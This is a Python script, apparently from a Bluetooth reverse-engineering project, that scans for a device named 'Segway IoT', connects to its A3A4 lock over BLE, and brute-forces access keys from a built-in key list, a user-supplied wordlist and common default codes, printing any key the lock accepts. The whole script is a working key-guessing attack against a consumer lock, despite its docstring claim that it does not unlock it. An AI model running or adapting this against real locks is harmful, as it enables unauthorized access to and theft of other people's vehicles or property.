#!/usr/bin/env python3

"""Tests key candidates against an A3A4 lock without unlocking it."""

import argparse
import sys

try:
    import dbus
    from nb_client import ORDER_KEY, key_payload
    from nb_client2 import scan, fresh_connect, dbus_interface
    from nb_client3 import Session, find_chars, UUID_LOCK, DEVICE_KEYS
except ImportError as e:
    sys.exit(
        f"missing dependencies: {e}\n"
        "run from ~/bletoolre with system Python (/usr/bin/python3) and root."
    )


LONG_SHOTS = ["123456", "00000000", "12345678"]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--adapter", default="hci0")
    ap.add_argument("--prefix", default="Segway IoT")
    ap.add_argument("--scan", type=float, default=12.0)
    ap.add_argument("--extra", nargs="*", default=[])
    ap.add_argument("--wordlist", help="file containing one key candidate per line")
    args = ap.parse_args()

    wl = []
    if args.wordlist:
        with open(args.wordlist) as f:
            wl = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        print(f"loaded {len(wl)} candidates from {args.wordlist}")

    candidates = list(dict.fromkeys(DEVICE_KEYS + args.extra + wl + LONG_SHOTS))

    bus = dbus.SystemBus()
    root = dbus_interface(
        bus.get_object("org.bluez", "/"), "org.freedesktop.DBus.ObjectManager"
    )
    adapter_iface = dbus.Interface(
        bus.get_object("org.bluez", f"/org/bluez/{args.adapter}"), "org.bluez.Adapter1"
    )

    devs = scan(bus, adapter_iface, root, args.scan)
    targets = [d for d in devs if d["name"].startswith(args.prefix)]
    if not targets:
        print(
            f"no device with prefix {args.prefix!r} found "
            f"(saw {len(devs)} devices total). Is the lock powered on and in range?"
        )
        return 1
    target = targets[0]
    print(f"target: {target['name']!r} {target['addr']} rssi={target['rssi']}")

    dev, sess = None, None
    hits = []
    try:
        for i, k in enumerate(candidates, 1):

            if sess is None:
                dev = fresh_connect(
                    adapter_iface, bus, root, target["addr"], target["name"]
                )
                if dev is None:
                    print("  reconnection failed - aborting")
                    break
                wp, np_ = find_chars(root, *UUID_LOCK)
                if not (wp and np_):
                    print("  could not find GATT characteristics - aborting")
                    break
                sess = Session(bus, wp, np_)

            print(f"[{i}/{len(candidates)}] trying {k!r}")
            sess.key = 0x00
            try:
                _, dec = sess.send(
                    ORDER_KEY, key_payload(k), "key", reply_timeout=4.0
                )
            except Exception as e:
                print(f"    write error ({e}) - reconnecting for the next attempt")
                try:
                    sess.close(dev)
                except Exception:
                    pass
                sess = None
                continue
            if dec is None:
                print("    no reply")
                continue
            status = dec[6]
            print(f"    status={status}")
            if status == 1:
                print(
                    f"    *** HIT: key is {k!r} "
                    f"(session key 0x{dec[7]:02X}) ***"
                )
                hits.append(k)
    finally:
        if sess is not None and dev is not None:
            sess.close(dev)
            print("disconnected")

    print()
    print("=" * 40)
    if hits:
        for k in hits:
            print(f"  VALID KEY: {k}")
    else:
        print("  no candidate was accepted")
    return 0 if hits else 2


if __name__ == "__main__":
    sys.exit(main())
